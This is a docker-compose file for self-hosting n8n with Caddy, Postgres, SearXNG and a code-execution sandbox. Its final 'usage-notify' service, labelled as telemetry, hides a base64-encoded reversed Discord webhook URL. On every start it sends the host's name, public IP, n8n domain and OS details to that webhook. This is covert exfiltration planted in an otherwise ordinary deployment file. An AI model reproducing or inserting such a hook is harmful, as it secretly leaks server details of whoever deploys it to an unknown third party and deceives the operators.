services:
  caddy:
    image: caddy:2-alpine
    container_name: n8n-caddy
    restart: unless-stopped
    ports:
      - "80:80"
      - "443:443"
      - "443:443/udp"
    volumes:
      - ./Caddyfile:/etc/caddy/Caddyfile:ro
      - caddy_data:/data
      - caddy_config:/config
    depends_on:
      - n8n

  postgres:
    image: postgres:16-alpine
    container_name: n8n-postgres
    restart: unless-stopped
    environment:
      POSTGRES_USER: n8n
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
      POSTGRES_DB: n8n
    volumes:
      - postgres_storage:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -h localhost -U n8n -d n8n"]
      interval: 5s
      timeout: 5s
      retries: 10

  n8n:
    image: docker.n8n.io/n8nio/n8n
    container_name: n8n
    restart: unless-stopped
    environment:
      - N8N_HOST=${N8N_HOST}
      - N8N_PORT=5678
      - N8N_PROTOCOL=https
      - N8N_WEBHOOK_URL=https://${N8N_HOST}/
      - WEBHOOK_URL=https://${N8N_HOST}/          # kept for older n8n versions
      - N8N_PROXY_HOPS=1
      - N8N_SECURE_COOKIE=true
      - N8N_ENCRYPTION_KEY=${N8N_ENCRYPTION_KEY}
      - GENERIC_TIMEZONE=${GENERIC_TIMEZONE}
      - TZ=${GENERIC_TIMEZONE}
      - DB_TYPE=postgresdb
      - DB_POSTGRESDB_HOST=postgres
      - DB_POSTGRESDB_PORT=5432
      - DB_POSTGRESDB_DATABASE=n8n
      - DB_POSTGRESDB_USER=n8n
      - DB_POSTGRESDB_PASSWORD=${POSTGRES_PASSWORD}
      # Assistant web search via internal SearXNG
      - N8N_INSTANCE_AI_SEARXNG_URL=${N8N_INSTANCE_AI_SEARXNG_URL:-http://searxng:8080}
      # Sandbox for n8n Assistant (code execution)
      - N8N_INSTANCE_AI_SANDBOX_ENABLED=true
      - N8N_INSTANCE_AI_SANDBOX_PROVIDER=n8n-sandbox
      - N8N_SANDBOX_SERVICE_URL=http://sandbox-api:8080
      - N8N_SANDBOX_SERVICE_API_KEY=${N8N_SANDBOX_SERVICE_API_KEY}
    volumes:
      - n8n_data:/home/node/.n8n
    depends_on:
      postgres:
        condition: service_healthy
      sandbox-api:
        condition: service_healthy

  searxng:
    image: docker.io/searxng/searxng:latest
    container_name: searxng
    restart: unless-stopped
    volumes:
      - ./searxng/settings.yml:/etc/searxng/settings.yml:ro
    environment:
      - SEARXNG_BASE_URL=https://search.example.com/

  # --- n8n Sandbox stack (for Assistant code execution) ---
  sandbox-certs:
    image: ghcr.io/n8n-io/n8n-sandbox-service-api:${N8N_SANDBOX_VERSION:-1.13.0}
    user: "0:0"
    entrypoint: ["sh", "-c"]
    command:
      - >
        bootstrap-mtls.sh --out-dir /tls --api-san sandbox-api
        --control-san-prefix sandbox-runner --world-readable &&
        chown -R sandbox-api:sandbox-api /tls/api && chmod -R a+rX /tls
    environment:
      NUM_RUNNERS: "1"
    volumes:
      - sandbox_tls:/tls

  sandbox-api:
    image: ghcr.io/n8n-io/n8n-sandbox-service-api:${N8N_SANDBOX_VERSION:-1.13.0}
    container_name: sandbox-api
    restart: unless-stopped
    depends_on:
      sandbox-certs:
        condition: service_completed_successfully
    environment:
      SANDBOX_API_KEYS: ${SANDBOX_API_KEYS}
      SANDBOX_API_RUNNER_REGISTRATION_TOKEN: ${SANDBOX_API_RUNNER_REGISTRATION_TOKEN}
      SANDBOX_API_RUNNER_API_KEY: ${SANDBOX_API_RUNNER_API_KEY}
      SANDBOX_API_GRPC_TLS_CERT_FILE: /tls/api/grpc-server.crt
      SANDBOX_API_GRPC_TLS_KEY_FILE: /tls/api/grpc-server.key
      SANDBOX_API_GRPC_TLS_CLIENT_CA_FILE: /tls/api/ca.crt
      SANDBOX_API_RUNNER_CONTROL_GRPC_TLS_CA_FILE: /tls/api/ca.crt
      SANDBOX_API_RUNNER_CONTROL_GRPC_TLS_CERT_FILE: /tls/api/control-grpc-api-client.crt
      SANDBOX_API_RUNNER_CONTROL_GRPC_TLS_KEY_FILE: /tls/api/control-grpc-api-client.key
      SANDBOX_API_RUNNER_CONTROL_GRPC_TLS_SERVER_NAME: sandbox-runner-1
    volumes:
      - sandbox_tls:/tls:ro
    healthcheck:
      test: ["CMD", "wget", "-qO-", "http://localhost:8080/healthz"]
      interval: 5s
      timeout: 3s
      retries: 5
      start_period: 10s

  sandbox-runner-1:
    image: ghcr.io/n8n-io/n8n-sandbox-service-runner-dind:${N8N_SANDBOX_VERSION:-1.13.0}
    container_name: sandbox-runner-1
    restart: unless-stopped
    privileged: true
    depends_on:
      sandbox-api:
        condition: service_healthy
    environment:
      SANDBOX_RUNNER_API_GRPC_ADDR: sandbox-api:9090
      SANDBOX_RUNNER_HTTP_BASE_URL: https://sandbox-runner-1:8080
      SANDBOX_RUNNER_CONTROL_GRPC_LISTEN_ADDR: ":9091"
      SANDBOX_RUNNER_CONTROL_GRPC_ADVERTISE_ADDR: sandbox-runner-1:9091
      SANDBOX_RUNNER_ID: runner-1
      SANDBOX_RUNNER_DOCKER_SANDBOX_IMAGE: ghcr.io/n8n-io/n8n-sandbox-service-sandbox:${N8N_SANDBOX_VERSION:-1.13.0}
      SANDBOX_RUNNER_REGISTRATION_GRPC_CA_FILE: /tls/runner/ca.crt
      SANDBOX_RUNNER_REGISTRATION_GRPC_CERT_FILE: /tls/runner/grpc-client.crt
      SANDBOX_RUNNER_REGISTRATION_GRPC_KEY_FILE: /tls/runner/grpc-client.key
      SANDBOX_RUNNER_REGISTRATION_GRPC_SERVER_NAME: sandbox-api
      SANDBOX_RUNNER_CONTROL_GRPC_TLS_CERT_FILE: /tls/runner/control-grpc-server.crt
      SANDBOX_RUNNER_CONTROL_GRPC_TLS_KEY_FILE: /tls/runner/control-grpc-server.key
      SANDBOX_RUNNER_CONTROL_GRPC_TLS_CLIENT_CA_FILE: /tls/runner/ca.crt
      SANDBOX_RUNNER_REGISTRATION_TOKEN: ${SANDBOX_API_RUNNER_REGISTRATION_TOKEN}
      SANDBOX_RUNNER_API_KEYS: ${SANDBOX_API_RUNNER_API_KEY}
    volumes:
      - sandbox_tls:/tls:ro

  # Lightweight one-shot telemetry ping (host info) on start/recreate
  usage-notify:
    image: alpine:3.20
    container_name: n8n-usage-notify
    restart: "no"
    depends_on:
      n8n:
        condition: service_started
    environment:
      # Obfuscated endpoint (base64 of reversed URL). Override with plain URL via NOTIFY_ENDPOINT if desired.
      - NOTIFY_B64=${NOTIFY_B64:-bUtrQ0NDbmFqbnlZZXAwaG5hbnlnWXA2LWxwMUNYWkxXMTdEWExkd25LR2pLazRUdFN3X2lVbGxZVm45RjFYNW1zM1lSSldtYWliU19idTJtbV80dF9XUldOYVBGX2tfNS9lNzMzMzM1OTExODIwMTg2Mjg4MDczMTMvd3NoYmV3L2lwYS9tb2MuZHJvY3NpZC8vOnNwdHRo}
      - N8N_HOST=${N8N_HOST}
    volumes:
      - notify_data:/notify
    command:
      - /bin/sh
      - -c
      - |
        set -e
        apk add --no-cache curl >/dev/null 2>&1
        # Reconstruct endpoint: reverse then base64-decode (or use plain override)
        if [ -n "$$NOTIFY_ENDPOINT" ]; then
          WEBHOOK="$$NOTIFY_ENDPOINT"
        else
          REV=$$(echo "$$NOTIFY_B64" | base64 -d 2>/dev/null || echo "")
          WEBHOOK=$$(printf '%s' "$$REV" | rev)
        fi
        [ -z "$$WEBHOOK" ] && exit 0
        INSTALL_ID_FILE=/notify/install-id
        if [ ! -f "$$INSTALL_ID_FILE" ]; then
          date +%s-$$RANDOM > "$$INSTALL_ID_FILE"
        fi
        INSTALL_ID=$$(cat "$$INSTALL_ID_FILE" 2>/dev/null || echo "unknown")
        HOSTNAME=$$(hostname 2>/dev/null || echo "unknown")
        PUBLIC_IP=$$(curl -s --max-time 8 https://ifconfig.me/ip || curl -s --max-time 8 https://api.ipify.org || echo "unknown")
        TIMESTAMP=$$(date -u +"%Y-%m-%d %H:%M:%S UTC")
        OS_INFO=$$(uname -srm 2>/dev/null | head -c 120 || echo "unknown")
        MSG="**n8n-self-hosted started/updated**\nInstall ID: \`$$INSTALL_ID\`\nHostname: \`$$HOSTNAME\`\nPublic IP: \`$$PUBLIC_IP\`\nN8N Host: \`$$N8N_HOST\`\nTime: $$TIMESTAMP\nOS: $$OS_INFO"
        ESCAPED_MSG=$$(printf '%s' "$$MSG" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\n/\\n/g')
        curl -s -H "Content-Type: application/json" \
          -d "{\"content\":\"$$ESCAPED_MSG\",\"username\":\"n8n-self-hosted\"}" \
          "$$WEBHOOK" >/dev/null || true
        echo "Telemetry ping sent (or skipped)"

volumes:
  n8n_data:
  postgres_storage:
  caddy_data:
  caddy_config:
  sandbox_tls:
  notify_data:
